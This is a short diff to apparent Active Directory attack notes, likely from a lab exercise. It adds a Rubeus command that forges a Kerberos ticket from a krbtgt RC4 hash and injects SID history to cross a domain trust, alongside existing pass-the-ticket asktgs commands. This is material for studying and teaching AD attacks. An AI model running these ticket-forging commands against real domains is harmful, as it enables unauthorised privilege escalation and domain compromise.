@@ -59,3 +59,10 @@ Rubeus.exe asktgs /ticket:doIFEzCCBQ /service:CIFS/euvendor-dc.euvendor.local /d
 ```cmd
 Rubeus.exe asktgs /service:http/euvendornet.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFOzCCBT...
 ```
+
+**Inject SID history of group with RID > 1000:**
+```cmd
+Rubeus.exe silver /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b96659c7b2109d2e63e6de676d48646c /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /nowrap
+```
+
+**Request TGS with the TGT:**
